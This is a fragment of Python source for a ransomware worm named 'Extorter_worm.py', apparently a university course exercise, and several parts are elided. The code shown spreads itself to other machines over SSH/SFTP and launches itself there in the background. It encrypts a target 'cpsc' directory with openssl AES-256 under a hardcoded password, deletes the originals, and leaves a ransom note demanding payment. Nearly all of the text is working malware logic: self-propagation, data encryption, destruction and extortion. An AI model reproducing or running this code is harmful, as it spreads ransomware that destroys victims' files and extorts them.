...
INFECTED_MARKER_FILE = "/tmp/infectedExtorter.txt"
EXTORTFILE = "EXTORT.txt"
...
def markInfected():
	...
	fileObj.close()
#################################################################
# Give notic of extortion on desktop
#################################################################
def extortNotice():
	fileObj = open(EXTORTFILE, 'w')
	fileObj.write("Your cpsc directory and files have been encrypted if \nyou want the decryption password you will need to pay me @someRandomAttacker...")
	fileObj.close()
###############################################################
...
def spreadAndExecute(sshClient):
	...
	sftpClient.put("Extorter_worm.py", "Extorter_worm.py")
	ssh.exec_command("chmod a+x Extorter_worm.py")
	ssh.exec_command("nohup python Extorter_worm.py &")
	sftpClient.close()
...
if len(sys.argv) < 2:
	...
	try:
		...
		#make a tar file
		tar = tarfile.open("cpsc.tar", "w:gz")
		# Add the target directory to the tar file
		tar.add("cpsc/")

		# Close the archive file
		tar.close()
		#enable and use encryption on target file
		call(["chmod", "a+x", "./openssl"])
		call(["openssl", "aes-256-cbc", "-a", "-salt", "-in", "cpsc.tar", "-out", "cpsc.tar.enc", "-k", "cs456worm"])
		
		#remove the target directory and tar of directory leaving just encryption
		shutil.rmtree("cpsc/")
		os.remove("cpsc.tar")
		#let the victim know
		extortNotice()
